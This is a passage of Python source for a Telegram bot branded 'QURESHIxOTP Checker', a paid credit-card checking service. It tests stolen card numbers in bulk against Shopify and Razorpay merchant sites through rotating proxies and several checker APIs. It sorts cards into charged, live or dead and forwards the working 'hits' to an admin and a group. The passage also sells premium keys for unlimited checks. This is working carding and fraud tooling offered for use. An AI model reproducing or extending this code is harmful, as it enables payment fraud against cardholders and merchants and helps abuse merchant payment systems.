<b>💎 ᴘʀᴇᴍɪᴜᴍ ʙᴇɴᴇꜰɪᴛs:</b>
✅ ᴜɴʟɪᴍɪᴛᴇᴅ ᴄᴄ ᴄʜᴇᴄᴋs
✅ ʀᴀᴢᴏʀᴘᴀʏ + sʜᴏᴘɪꜰʏ
✅ ɴᴏ ᴅᴀɪʟʏ ʟɪᴍɪᴛ (ꜰʀᴇᴇ: 150)
✅ ᴘʀɪᴏʀɪᴛʏ sᴜᴘᴘᴏʀᴛ
✅ ʙᴜʟᴋ ᴜᴘ ᴛᴏ 100ᴋ ᴄᴄ
━━━━━━━━━━━━━━━━━━━━
<b>📅 ᴘʟᴀɴs: 7 ᴅᴀʏs ₹200 | 30 ᴅᴀʏs ₹500</b>
<b>👑 ʙᴜʏ: Admin</b>"""

    premium_buttons = [
        [
            Button.url("ʙᴜʏ ᴘʟᴀɴ", OWNER_URL, style="primary"),
            Button.inline("ᴍʏ ᴘʟᴀɴ", b"my_plan", style="primary"),
        ],
        [
            Button.inline("ᴛᴏᴏʟs", b"tools_menu", style="primary"),
        ],
        # 🔥 PREMIUM EXCLUSIVE — naye features (random premium emoji icons)
        [
            Button.inline("🤖 ᴀᴜᴛᴏᴘᴏsᴛ", b"uap_menu", style="success"),
        ],
    ]

    await event.edit(
        premium_emoji(premium_msg),
        buttons=premium_buttons,
        parse_mode="html"
    )
# ==================== MY PLAN ====================
@bot.on(events.CallbackQuery(data=b"my_plan"))
async def my_plan_handler(event):
    user_id = event.sender_id
    
    try:
        sender = await event.get_sender()
        first_name = sender.first_name or "Unknown"
    except:
        first_name = "Unknown"

    if is_admin(user_id):
        plan_status = "👑 ᴀᴅᴍɪɴ - ᴜɴʟɪᴍɪᴛᴇᴅ"
        expiry = "∞ ʟɪꜰᴇᴛɪᴍᴇ"
        emoji = "👑"
        daily = "∞"
    elif is_premium(user_id):
        plan_status = "💎 ᴘʀᴇᴍɪᴜᴍ ᴀᴄᴛɪᴠᴇ"
        emoji = "💎"
        daily = "∞"
        try:
            with open(PREMIUM_FILE, "r") as f:
                for line in f:
                    if str(user_id) in line:
                        _, exp = line.strip().split("|")
                        expiry = exp
                        break
        except:
            expiry = "ᴀᴄᴛɪᴠᴇ"
    else:
        plan_status = "⭐ ꜰʀᴇᴇ ᴜsᴇʀ"
        expiry = "ɴ/ᴀ"
        emoji = "⭐"
        usage = get_daily_usage(user_id)
        daily = f"{usage['cc_count']}/150"

    plan_msg = f"""<b>{emoji} ᴍʏ ᴘʟᴀɴ ᴅᴇᴛᴀɪʟs {emoji}</b>
━━━━━━━━━━━━━━━━━━━━
<b>💎 ᴜsᴇʀ: {first_name}</b>
<b>👑 ɪᴅ: <code>{user_id}</code></b>
<b>💠 sᴛᴀᴛᴜs: {plan_status}</b>
<b>⏳ ᴇxᴘɪʀʏ: {expiry}</b>
<b>📊 ᴅᴀɪʟʏ ᴜsᴇᴅ: {daily}</b>
━━━━━━━━━━━━━━━━━━━━
<b>💎 ᴜᴘɢʀᴀᴅᴇ: Admin</b>
<b>🔑 ʀᴇᴅᴇᴇᴍ: /redeem KEY_HERE</b>"""

    await event.edit(
        premium_emoji(plan_msg),
        buttons=[[Button.inline("ᴘʟᴀɴ", b"premium_tools", style="success")]],
        parse_mode="html"
    )
    



# ==================== REDEEM MULTI-DEVICE KEY ====================
@bot.on(events.NewMessage(pattern=r'^/key\s+(\d+)\s+(\d+)\s+(\d+)$'))
async def generate_key_cmd(event):
    """Generate keys with device limit: /key COUNT DAYS DEVICE_LIMIT"""
    
    if not is_admin(event.sender_id):
        await event.reply(premium_emoji("<b>❌ ᴏɴʟʏ ᴀᴅᴍɪɴs ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ.</b>"), parse_mode="html")
        return

    try:
        count = int(event.pattern_match.group(1))
        days = int(event.pattern_match.group(2))
        device_limit = int(event.pattern_match.group(3))
        if count < 1 or days < 1 or device_limit < 1:
            raise ValueError
    except:
        await event.reply(premium_emoji("""<b>❌ ɪɴᴠᴀʟɪᴅ ꜰᴏʀᴍᴀᴛ</b>
━━━━━━━━━━━━━━━━━━━━
<b>🔑 ᴜsᴀɢᴇ:</b> <code>/key COUNT DAYS DEVICE_LIMIT</code>

<b>💡 ᴇxᴀᴍᴘʟᴇs:</b>
<code>/key 1 4 20</code> ➜ 1 ᴋᴇʏ, 4 ʜᴏᴜʀs, 20 ᴜsᴇʀs
<code>/key 5 7 10</code> ➜ 5 ᴋᴇʏs, 7 ᴅᴀʏs, 10 ᴜsᴇʀs
━━━━━━━━━━━━━━━━━━━━
<b>👑 ᴀᴅᴍɪɴ ᴏɴʟʏ!</b>"""), parse_mode="html")
        return

    ok, limit_msg = _reserve_admin_key_quota(event.sender_id, count, days)
    if not ok:
        await event.reply(premium_emoji(limit_msg), parse_mode="html")
        return

    keys = []
    for _ in range(count):
        key = generate_multi_device_key(days, device_limit)
        keys.append(key)

    # ✅ CREATE TXT FILE
    timestamp = datetime.now(pytz.timezone('Asia/Kolkata')).strftime("%Y%m%d_%H%M%S")
    filename = f"Keys_{timestamp}.txt"
    
    async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
        await f.write("⭐ KEYS GENERATED ⭐\n")
        await f.write("=" * 30 + "\n")
        await f.write(f"Plan: Core Access\n")
        await f.write(f"Duration: {days}h\n")
        await f.write(f"Key Expiry: {days}h\n")
        await f.write(f"Max Users: {device_limit}\n")
        await f.write(f"Quantity: {count}\n")
        await f.write("=" * 30 + "\n\n")
        
        for i, key in enumerate(keys, 1):
            await f.write(f"{i}. {key}\n")
        
        await f.write("\n" + "=" * 30 + "\n")
        await f.write("Bot: Admin\n")
        await f.write("Redeem: /redeem [key]\n")

    # ✅ SEND BOTH - MESSAGE + TXT FILE
    # Message format (exactly as you want)
    msg = f"""<b>𝗞𝗲𝘆𝘀 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱</b>  ✅
━━━━━━━━━━━━━━━━━
👑 <b>𝗣𝗹𝗮𝗻:</b> 🛠️ premium 
🔗 <b>𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻:</b> {days}Day
✅ <b>𝗞𝗲𝘆 𝗘𝘅𝗽𝗶𝗿𝘆:</b> {days}Day
⭐ <b>𝗠𝗮𝘅 𝗨𝘀𝗲𝗿𝘀:</b> {device_limit}
⭐ <b>𝗤𝘂𝗮𝗻𝘁𝗶𝘁𝘆:</b> {count}
━━━━━━━━━━━━━━━━━"""

    # Add keys with numbers
    for i, key in enumerate(keys, 1):
        msg += f"\n{i}. <code>{key}</code>"

    msg += f"""
━━━━━━━━━━━━━━━━━
⚡ <b>Bot :</b> Admin
✅ <b>Redeem :</b> <code>/redeem [key]</code>"""

    # Send message with TXT file attachment
    await bot.send_message(
        event.chat_id,
        premium_emoji(msg),
        file=filename,
        parse_mode="html"
    )

    # ✅ DELETE FILE AFTER SENDING
    try: os.remove(filename)
    except: pass
# ==================== CHECK KEY STATS ====================
@bot.on(events.NewMessage(pattern=r'^/redeem\s+(.+)'))
async def redeem_cmd(event):
    user_id = event.sender_id
    key_input = event.pattern_match.group(1).strip()  # ✅ .upper() HATAYA - key case-sensitive hai

    if not key_input:
        await event.reply(premium_emoji("""<b>❌ ɪɴᴠᴀʟɪᴅ ꜰᴏʀᴍᴀᴛ</b>
━━━━━━━━━━━━━━━━━━━━
<b>🔑 ᴜsᴀɢᴇ:</b> <code>/redeem KEY_HERE</code>

<b>💡 ᴇxᴀᴍᴘʟᴇ:</b>
<code>/redeem QURESHIxOTP-MULTI-A1B2C3-30D-50U</code>
━━━━━━━━━━━━━━━━━━━━
<b>👑 ɢᴇᴛ ᴋᴇʏ:</b> Admin</b>"""), parse_mode="html")
        return

    keys_list = [k.strip() for k in re.split(r'[\s\n]+', key_input) if k.strip()]
    if len(keys_list) > 1:
        await event.reply(premium_emoji("""<b>❌ ᴍᴜʟᴛɪᴘʟᴇ ᴋᴇʏs ᴅᴇᴛᴇᴄᴛᴇᴅ</b>
━━━━━━━━━━━━━━━━━━━━
<b>⚠️ ᴇᴋ ᴛɪᴍᴇ ᴘᴇ sɪʀꜰ ᴇᴋ ᴋᴇʏ ʀᴇᴅᴇᴇᴍ ᴋᴀʀ sᴀᴋᴛᴇ ʜᴏ!</b>

<b>💡 ᴇᴋ ᴋᴇʏ ᴅᴀᴀʟᴏ:</b>
<code>/redeem KEY_HERE</code>"""), parse_mode="html")
        return

    key = keys_list[0]
    
    processing_msg = await event.reply(premium_emoji("""<b>🔄 ᴘʀᴏᴄᴇssɪɴɢ ᴋᴇʏ...</b>

🔑 <b>ᴠᴇʀɪꜰʏɪɴɢ ʏᴏᴜʀ ᴋᴇʏ...</b>"""), parse_mode="html")
    await asyncio.sleep(2)
    
    result = redeem_multi_device_key(key, user_id)

    if result == "success":
        try:
            await processing_msg.delete()
        except:
            pass
        
        key_info = get_key_info(key)
        expiry = key_info.get('expiry', 'ᴀᴄᴛɪᴠᴇ')
        devices_used = key_info.get('used', 0)
        device_limit = key_info.get('limit', 0)
        
        # ✅ PREMIUM UI - BETTER FORMATTING
        await event.reply(premium_emoji(f"""<b>🎉 ᴘʀᴇᴍɪᴜᴍ ᴀᴄᴛɪᴠᴀᴛᴇᴅ sᴜᴄᴄᴇssꜰᴜʟʟʏ! 🎉</b>
━━━━━━━━━━━━━━━━━━━━
💎 <b>sᴛᴀᴛᴜs:</b> ᴘʀᴇᴍɪᴜᴍ ᴀᴄᴛɪᴠᴇ
👤 <b>ᴜsᴇʀ ɪᴅ:</b> <code>{user_id}</code>
⏳ <b>ᴇxᴘɪʀʏ:</b> {expiry}
━━━━━━━━━━━━━━━━━━━━
📱 <b>ᴅᴇᴠɪᴄᴇ ᴜsᴀɢᴇ:</b> {devices_used}/{device_limit}
🔑 <b>ᴋᴇʏ:</b> <code>{key[:15]}...</code>
━━━━━━━━━━━━━━━━━━━━
<b>🔥 ʏᴏᴜʀ ʙᴇɴᴇꜰɪᴛs:</b>
✅ ᴜɴʟɪᴍɪᴛᴇᴅ ᴄᴄ ᴄʜᴇᴄᴋs
✅ ʀᴀᴢᴏʀᴘᴀʏ + sʜᴏᴘɪꜰʏ
✅ ɴᴏ ᴅᴀɪʟʏ ʟɪᴍɪᴛ
✅ ʙᴜʟᴋ ᴄʜᴇᴄᴋ ᴜᴘ ᴛᴏ 100ᴋ
✅ ᴘʀɪᴏʀɪᴛʏ sᴜᴘᴘᴏʀᴛ
━━━━━━━━━━━━━━━━━━━━
<b>📋 ᴄᴏᴍᴍᴀɴᴅs:</b>
<code>/cc card|mm|yy|cvv</code> ➜ sɪɴɢʟᴇ
<code>/chk</code> ➜ ʙᴜʟᴋ ᴄʜᴇᴄᴋ
<code>/plan</code> ➜ ᴄʜᴇᴄᴋ sᴛᴀᴛᴜs
━━━━━━━━━━━━━━━━━━━━
👑 <b>ʙᴏᴛ ʙʏ:</b> ⧼ 𝗗𝗲𝗳𝗳⁺⁺ ⧽ QURESHIxOTP</b>"""), parse_mode="html")
        
    elif result == "already_premium":
        try:
            await processing_msg.delete()
        except:
            pass
        
        await event.reply(premium_emoji("""<b>⚠️ ᴀʟʀᴇᴀᴅʏ ᴘʀᴇᴍɪᴜᴍ!</b>
━━━━━━━━━━━━━━━━━━━━
💎 <b>ᴀᴀᴘᴋᴀ ᴘʀᴇᴍɪᴜᴍ ᴀʟʀᴇᴀᴅʏ ᴀᴄᴛɪᴠᴇ ʜᴀɪ!</b>

📊 <b>ᴄʜᴇᴄᴋ:</b> <code>/plan</code>
👑 <b>ᴄᴏɴᴛᴀᴄᴛ:</b> Admin</b>"""), parse_mode="html")
        
    elif result == "device_limit_reached":
        try:
            await processing_msg.delete()
        except:
            pass
        
        key_info = get_key_info(key)
        device_limit = key_info.get('limit', 0)
        
        await event.reply(premium_emoji(f"""<b>❌ ᴅᴇᴠɪᴄᴇ ʟɪᴍɪᴛ ʀᴇᴀᴄʜᴇᴅ!</b>
━━━━━━━━━━━━━━━━━━━━
🔑 <b>ʏᴇʜ ᴋᴇʏ ᴀᴘɴɪ ᴍᴀx ʟɪᴍɪᴛ ᴘᴇ ᴘᴀʜᴜɴᴄʜ ɢᴀʏɪ!</b>

📱 <b>ᴍᴀx ᴅᴇᴠɪᴄᴇs:</b> {device_limit}
👥 <b>ᴀʟʟ {device_limit} sʟᴏᴛs ᴜsᴇᴅ!</b>
━━━━━━━━━━━━━━━━━━━━
💡 <b>ꜰʀᴇsʜ ᴋᴇʏ ʟᴇɴᴇ ᴋᴇ ʟɪʏᴇ:</b>
👑 Admin</b>"""), parse_mode="html")
        
    elif result == "used":
        try:
            await processing_msg.delete()
        except:
            pass
        
        await event.reply(premium_emoji(f"""<b>❌ ᴋᴇʏ ᴀʟʀᴇᴀᴅʏ ʀᴇᴅᴇᴇᴍᴇᴅ!</b>
━━━━━━━━━━━━━━━━━━━━
🔑 <b>ᴀᴀᴘ ʏᴇʜ ᴋᴇʏ ᴘᴇʜʟᴇ sᴇ ᴜsᴇ ᴋᴀʀ ᴄʜᴜᴋᴇ ʜᴏ!</b>
━━━━━━━━━━━━━━━━━━━━
👑 <b>ᴄᴏɴᴛᴀᴄᴛ:</b> Admin</b>
📅 <b>ᴘʟᴀɴs: ₹200/ᴡᴇᴇᴋ | ₹500/ᴍᴏɴᴛʜ</b>"""), parse_mode="html")
        
    else:
        try:
            await processing_msg.delete()
        except:
            pass
        
        await event.reply(premium_emoji(f"""<b>❌ ɪɴᴠᴀʟɪᴅ ᴏʀ ᴇxᴘɪʀᴇᴅ ᴋᴇʏ!</b>
━━━━━━━━━━━━━━━━━━━━
🔑 <b>ʏᴇʜ ᴋᴇʏ ᴠᴀʟɪᴅ ɴᴀʜɪ ʜᴀɪ!</b>

💡 <b>ᴄʜᴇᴄᴋ ᴋᴀʀᴏ:</b>
✅ ᴋᴇʏ sᴀʜɪ ᴛʏᴘᴇ ᴋɪ?
✅ ᴋᴇʏ ᴇxᴘɪʀᴇ ᴛᴏ ɴᴀʜɪ?
✅ ᴅᴇᴠɪᴄᴇ ʟɪᴍɪᴛ ꜰᴜʟʟ?
━━━━━━━━━━━━━━━━━━━━
👑 <b>ꜰʀᴇsʜ ᴋᴇʏ:</b> Admin</b>
📅 <b>ᴘʟᴀɴs: ₹200/ᴡᴇᴇᴋ | ₹500/ᴍᴏɴᴛʜ</b>"""), parse_mode="html")


@bot.on(events.NewMessage(pattern=r'^/keystats\s+(.+)'))
async def key_stats_cmd(event):
    """Check multi-device key usage stats"""
    
    if event.sender_id not in KEY_ADMINS:
        await event.reply(premium_emoji("<b>❌ ᴏɴʟʏ ᴀᴅᴍɪɴs ᴄᴀɴ ᴜsᴇ ᴛʜɪs!</b>"), parse_mode="html")
        return
    
    key = event.pattern_match.group(1).strip()  # ⭐ .upper() HATAYA
    key_info = get_key_info(key)
    
    if not key_info:
        await event.reply(premium_emoji("<b>❌ ᴋᴇʏ ɴᴏᴛ ꜰᴏᴜɴᴅ!</b>"), parse_mode="html")
        return
    
    devices_used = key_info.get('used', 0)
    device_limit = key_info.get('limit', 0)
    days = key_info.get('days', 0)
    created = key_info.get('created', 'ᴜɴᴋɴᴏᴡɴ')
    users_list = key_info.get('users', [])
    
    progress = "🟢" * devices_used + "⚪" * (device_limit - devices_used)
    
    users_text = "\n".join([f"<code>{uid}</code>" for uid in users_list]) if users_list else "ɴᴏ ᴜsᴇʀs ʏᴇᴛ"
    
    msg = f"""<b>📊 ᴋᴇʏ sᴛᴀᴛɪsᴛɪᴄs 📊</b>
━━━━━━━━━━━━━━━━━━━━
<b>🔑 ᴋᴇʏ:</b> <code>{key[:20]}...</code>
<b>💎 ᴘʟᴀɴ:</b> {days} ᴅᴀʏs
<b>📱 ᴅᴇᴠɪᴄᴇs:</b> {devices_used}/{device_limit}
<b>📊 ᴘʀᴏɢʀᴇss:</b> {progress}
<b>📅 ᴄʀᴇᴀᴛᴇᴅ:</b> {created}
━━━━━━━━━━━━━━━━━━━━
<b>👥 ʀᴇᴅᴇᴇᴍᴇᴅ ᴜsᴇʀs:</b>
{users_text}
━━━━━━━━━━━━━━━━━━━━
<b>📈 ᴜsᴇᴅ:</b> {devices_used}/{device_limit} ({(devices_used/device_limit*100):.1f}%)"""

    await event.reply(premium_emoji(msg), parse_mode="html")
# ==================== INDIAN TIME FUNCTION ====================
def get_indian_time():
    """Real Indian Standard Time (IST) — UTC+5:30"""
    ist = pytz.timezone('Asia/Kolkata')
    now = datetime.now(ist)
    return now.strftime("%I:%M:%S %p IST")  # 12-hour format: 02:30:45 PM IST
# ============================================================
# COPY CC HANDLER — REAL CC COPY
# ============================================================
@bot.on(events.CallbackQuery(pattern=b"copycc_"))
async def copy_cc_handler(event):
    try:
        data = event.data.decode('utf-8')
        # ✅ REAL CC EXTRACT — CARD|MM|YYYY|CVV
        cc = data.split("_", 1)[1]
        await event.answer(f"✅ CC Copied!\n\n{cc}", alert=True)
    except Exception as e:
        print(f"Copy error: {e}")
        await event.answer("❌ Copy failed", alert=True)
        
async def check_batch_worker_11(user_id, cards, sites, proxies, api_index, status_msg_id, total_cards, shared_data):
    """Har API apne cards check kare - 11 APIs support"""
    
    queue = asyncio.Queue()
    for card in cards:
        await queue.put(card)
    
    api_name = f"API-{api_index} ⚡"
    api_url = get_api(api_index)
    
    async def worker():
        while not queue.empty():
            try:
                card = await asyncio.wait_for(queue.get(), timeout=0.5)
            except asyncio.TimeoutError:
                continue
            except asyncio.QueueEmpty:
                break
            
            proxy = random.choice(proxies)
            
            result = await check_card_with_retry(
                card, sites, [proxy], 
                max_retries=3, 
                api_url=api_url,
                api_name=api_name
            )
            
            # ✅ SHARED RESULTS UPDATE
            if result['status'] == 'Charged':
                shared_data['charged'].append(result)
                asyncio.create_task(send_hit_to_admin(result, user_id, "Charged"))
                try:
                    sender = await bot.get_entity(user_id)
                    username = sender.username if sender.username else f"user_{user_id}"
                    asyncio.create_task(send_realtime_hit_group(user_id, result, 'Charged', username))
                    asyncio.create_task(send_realtime_hit_dm(user_id, result, 'Charged', username))
                except:
                    pass
                update_hits(user_id, result['status'], result['card'], result.get('gateway', 'Auto Shopify'), result.get('price', '-'), result.get('site', 'Unknown'))
            
            elif result['status'] == 'Approved':
                shared_data['approved'].append(result)
                asyncio.create_task(send_hit_to_admin(result, user_id, "Approved"))
                try:
                    sender = await bot.get_entity(user_id)
                    username = sender.username if sender.username else f"user_{user_id}"
                    asyncio.create_task(send_realtime_hit_dm(user_id, result, 'Approved', username))
                except:
                    pass
                update_hits(user_id, result['status'], result['card'], result.get('gateway', 'Auto Shopify'), result.get('price', '-'), result.get('site', 'Unknown'))
            
            else:
                shared_data['dead'].append(result)
                if result['status'] == 'Site Error':
                    shared_data['errors'] = shared_data.get('errors', 0) + 1
                    shared_data['api_errors'] = shared_data.get('api_errors', 0) + 1
                update_hits(user_id, result['status'], result['card'], result.get('gateway', 'Auto Shopify'), result.get('price', '-'), result.get('site', 'Unknown'))
            
            shared_data['checked'] += 1
            shared_data['last_result'] = result
            queue.task_done()
            
            # ✅ HAR 20 CARDS PE UPDATE
            if shared_data['checked'] % 25 == 0 or shared_data['checked'] == total_cards:
                try:
                    await update_progress(
                        user_id, 
                        status_msg_id, 
                        shared_data, 
                        shared_data['checked'], 
                        first_name="User",
                        is_razorpay=False
                    )
                except Exception as e:
                    print(f"Progress update error: {e}")
    
    workers = [asyncio.create_task(worker()) for _ in range(10)]
    await asyncio.gather(*workers)
# ============================================================
@bot.on(events.NewMessage(pattern=r'^/cc(?:\s|$)'))
async def single_cc_check(event):
    user_id = event.sender_id
    save_user(user_id)

    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("""<b>❌ NO PROXY IN proxy.txt!</b>"""), parse_mode="html")
        return

    allowed, remaining = check_limits(user_id, False)
    if not allowed:
        await event.reply(premium_emoji("❌ Daily limit khatam. Premium le lo."))
        return

    if len(event.message.text.strip()) <= 4:
        await event.reply("Usage: `/cc 5209430225796165|01|27|458`")
        return

    try:
        sender = await event.get_sender()
        first_name = sender.first_name if sender.first_name else "User"
    except:
        first_name = "User"

    # ✅ /cc SIRF BOT SITES USE KARE
    global_sites = load_sites()

    if global_sites:
        sites = global_sites
        site_source = "BOT SITES"
    else:
        await event.reply(premium_emoji("""❌ **No bot sites available!**"""), parse_mode="html")
        return

    text = event.message.text or ""
    parts = text.split(' ', 1)

    if len(parts) < 2:
        await event.reply("❌ Data missing")
        return

    cc_input = parts[1].strip()
    cards = extract_cc(cc_input)
    if not cards:
        await event.reply(premium_emoji("❌ Invalid CC format. Use: card|mm|yyyy|cvv"))
        return

    card = cards[0]
    status_msg = await event.reply(premium_emoji(f"<b>⚡ Checking with {site_source}...</b>"), parse_mode='html')

    try:
        start_time = time.time()
        result = await check_card_with_retry(card, sites, proxies, max_retries=10)
        update_daily_usage(user_id, 1)

        # ✅ PEHLE GATEWAY AUR PRICE DEFINE KARO
        gateway = result.get("gateway", "𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮")
        price = result.get("price", "-")
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])

        # ✅ HITS SAVE KARO
        update_hits(user_id, result['status'], result['card'], gateway, price, result.get('site', 'Unknown'))

        # ✅ CLEAN RESPONSE — API URL HATANA
        raw_msg = str(result.get('message', 'Unknown Response'))
        if 'http' in raw_msg or '.vercel.app' in raw_msg or '.railway.app' in raw_msg or '.up.railway.app' in raw_msg:
            response_msg = 'API Response'
        elif 'PAYMENTS_CREDIT_CARD' in raw_msg:
            response_msg = raw_msg.replace('PAYMENTS_CREDIT_CARD', '').strip()
            if not response_msg:
                response_msg = 'API Response'
        else:
            response_msg = raw_msg[:60]

        if result.get('status') == 'Site Error' and result.get('site') and is_admin(user_id):
            current_sites = load_sites()
            if result['site'] in current_sites:
                new_sites = [s for s in current_sites if s != result['site']]
                async with aiofiles.open(SITES_FILE, 'w') as f:
                    for site in new_sites:
                        await f.write(f"{site}\n")
                await bot.send_message(user_id, f"🗑️ Dead site auto-removed: `{result['site'][:50]}`")

        if result['status'] == 'Charged':
            status_emoji = "💎"
            status_text = "Charged 💎"
        elif result['status'] == 'Approved':
            status_emoji = "🔥"
            status_text = "Live 🔥"
        else:
            status_emoji = "❌"
            status_text = "Dead ❌"

        is_razorpay = "razorpay" in gateway.lower() or "rz" in gateway.lower()
        currency = "₹" if is_razorpay else "$"

        if is_admin(user_id):
            plan = "👑 Admin"
        elif is_premium(user_id):
            plan = "💎 Premium"
        else:
            plan = "⭐ Free"

        try:
            me = await bot.get_me()
            bot_username = f"@{me.username}"
        except:
            bot_username = "Admin"

        ist = pytz.timezone('Asia/Kolkata')
        now = datetime.now(ist)
        current_time = now.strftime("%I:%M:%S %p IST")

        # ✅ FINAL RESPONSE - result use karo
        final_resp = f"""[❆] {status_text}

💳
   ⤷ <code>{result['card']}</code>
Gate ➳ {gateway} {price}{currency}

──────────
Resp ➳ {response_msg}
Bin ➳ <code>{brand} - {bank} - {country} {flag}</code>
──────────
⏱ ➳ {current_time}
🔗 ➳ <a href="tg://user?id={user_id}">{first_name}</a>
🤩 ➳ Bot By: ⧼ 𝗗𝗲𝗳𝗳⁺⁺ ⧽ QURESHIxOTP"""

        try:
            await status_msg.delete()
        except:
            pass

        await event.reply(
            premium_emoji(final_resp),
            parse_mode="html"
        )

        if result['status'] in ['Charged', 'Approved']:
            await send_hit_to_admin(result, user_id, result['status'])
            await send_realtime_hit_group(user_id, result, result['status'], first_name)
            await send_realtime_hit_dm(user_id, result, result['status'], first_name)

    except Exception as e:
        try:
            await status_msg.edit(premium_emoji(f"❌ Error: {str(e)[:80]}"), parse_mode='html')
        except:
            await event.reply(premium_emoji(f"❌ Error: {str(e)[:80]}"), parse_mode='html')
 
@bot.on(events.NewMessage(pattern='/fb'))            
async def feedback_command(event):
    user_id = event.sender_id
    
    # ✅ CHECK REPLY
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("""<b>❌ Usage:</b>
<code>/fb</code> — Reply to a photo or message

<b>💡 Example:</b>
Reply to a photo with <code>/fb</code>"""), parse_mode="html")
        return
    
    try:
        sender = await event.get_sender()
        first_name = sender.first_name or "User"
        username = sender.username or ""
        
        if username:
            display_name = f"@{username}"
        else:
            display_name = first_name
        
        # ✅ REPLY MESSAGE
        reply_msg = await event.get_reply_message()
        
        # ✅ GET FEEDBACK TEXT
        feedback_text = reply_msg.text or "No text provided"
        if len(feedback_text) > 500:
            feedback_text = feedback_text[:500] + "..."
        
        # ✅ CHECK IF PHOTO
        has_photo = False
        photo_file = None
        
        if reply_msg.photo:
            has_photo = True
            photo_file = await reply_msg.download_media()
        
        # ✅ BOT INFO
        try:
            me = await bot.get_me()
            bot_username = me.username or "Admin"
            bot_first_name = me.first_name or "QURESHIxOTP Checker"
        except:
            bot_username = "Admin"
            bot_first_name = "QURESHIxOTP Checker"
        
        # ✅ FEEDBACK MESSAGE
        feedback_msg = f"""<b></b>

<b>✨ 𝗨𝘀𝗲𝗿:</b> <a href="tg://user?id={user_id}">{display_name}</a>
<b>💎 𝗕𝗼𝘁:</b> @{bot_username}
━━━━━━━━━━━━━━━━━━━━
<b>📝 𝗙𝗲𝗲𝗱𝗯𝗮𝗰𝗸:</b>
<code>{feedback_text}</code>
"""

        # ✅ BUTTON — BOT PE LE JAYE
        buttons = [
            [Button.url(f"🤖 {bot_first_name}", f"https://t.me/{bot_username}", style="primary")]
        ]
        
        # ✅ SEND TO ADMIN
        admin_id = ADMIN_ID
        
        if has_photo and photo_file:
            await bot.send_file(
                admin_id,
                file=photo_file,
                caption=premium_emoji(feedback_msg),
                buttons=buttons,
                parse_mode="html"
            )
            try: os.remove(photo_file)
            except: pass
        else:
            await bot.send_message(
                admin_id,
                premium_emoji(feedback_msg),
                buttons=buttons,
                parse_mode="html"
            )
        
        # ✅ CONFIRM TO USER
        await event.reply(premium_emoji("✅ **Feedback sent to Admin!**\n\nThank you for your feedback. 🙏"), parse_mode="html")
        
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error: {str(e)[:100]}"), parse_mode="html")
                   
async def send_card_file(user_id, cards, title, file_prefix, is_dead=False):
    timestamp = datetime.now(pytz.timezone('Asia/Kolkata')).strftime("%Y%m%d_%H%M%S")
    filename = f"{file_prefix}_Cards_{user_id}_{timestamp}.txt"

    async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
        await f.write("=" * 70 + "\n")
        await f.write(f"⚡ {title} - QURESHIxOTP CHECKER ⚡\n")
        await f.write("=" * 70 + "\n\n")
        
        for r in cards:
            card = r.get('card', 'N/A')
            gateway = r.get('gateway', 'Auto Shopify')
            price = r.get('price', '-')
            
            raw_msg = str(r.get('message', 'Unknown'))
            if 'http' in raw_msg or '.vercel.app' in raw_msg or '.railway.app' in raw_msg:
                message = 'API Response'
            elif 'PAYMENTS_CREDIT_CARD' in raw_msg:
                message = raw_msg.replace('PAYMENTS_CREDIT_CARD', '').strip()
                if not message:
                    message = 'API Response'
            else:
                message = raw_msg[:100]
            
            first_name = r.get('first_name', 'User')
            username = r.get('username', '')
            
            if username and username != '':
                display_name = f"@{username}"
            elif first_name and first_name != 'Unknown' and first_name != 'User':
                display_name = first_name
            else:
                display_name = "User"
            
            if '|' in card:
                brand, _, _, bank, country, flag = await get_bin_info(card.split('|')[0])
            else:
                brand = bank = country = flag = '-'
            
            is_razorpay = "razorpay" in gateway.lower() or "rz" in gateway.lower()
            currency_symbol = "₹" if is_razorpay else "$"
            
            if "CHARGED" in title.upper():
                status_emoji = "💎"
                status_text = "Charged 💎"
            elif "LIVE" in title.upper():
                status_emoji = "🔥"
                status_text = "Live 🔥"
            elif "DEAD" in title.upper():
                status_emoji = "❌"
                status_text = "Dead ❌"
            else:
                status_emoji = "⚠️"
                status_text = "Unknown ⚠️"
            
            current_time = datetime.now(pytz.timezone('Asia/Kolkata')).strftime("%I:%M:%S %p IST")
            
            final_resp = f"""[❆] {status_text}

💳
   ⤷ {card}
Gate ➳ {gateway} {price}{currency_symbol}

──────────
Resp ➳ {message}
Bin ➳ {brand} - {bank} - {country} {flag}
──────────
⏱ ➳ {current_time}
🔗 ➳ {display_name}
🤩 ➳ Bot By ➳ ⧼ 𝗗𝗲𝗳𝗳⁺⁺ ⧽ QURESHIxOTP
==================================================
"""
            await f.write(final_resp)

    try:
        caption_msg = f"[❆] {title} – {len(cards)} cards"
        await bot.send_file(
            user_id,
            file=filename,
            caption=caption_msg
        )
    except Exception as e:
        print(f"❌ File send error: {e}")

    try:
        os.remove(filename)
    except:
        pass

    
@bot.on(events.NewMessage(pattern=r'^/chkproxy\s+'))
async def check_single_proxy(event):
    """Check a single proxy"""
    user_id = event.sender_id

    if not is_premium(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly premium users can use this command."), parse_mode='html')
        return

    proxy = event.message.text.split(' ', 1)[1].strip()
    if not proxy:
        await event.reply(premium_emoji("❌ Usage: <code>/chkproxy ip:port:user:pass</code>"), parse_mode='html')
        return

    status_msg = await event.reply(premium_emoji(f"🔄 Checking proxy: <code>{proxy}</code>..."), parse_mode='html')

    try:
        result = await test_proxy(proxy)

        if result['status'] == 'alive':
            await status_msg.edit(premium_emoji(f"✅ <b>Proxy is ALIVE!</b>\n\n<code>{proxy}</code>"), parse_mode='html')
        else:
            await status_msg.edit(premium_emoji(f"❌ <b>Proxy is DEAD!</b>\n\n<code>{proxy}</code>"), parse_mode='html')

    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error checking proxy: {e}"), parse_mode='html')
        
@bot.on(events.NewMessage(pattern='/clearproxy'))
async def clear_proxies(event):
    user_id = event.sender_id

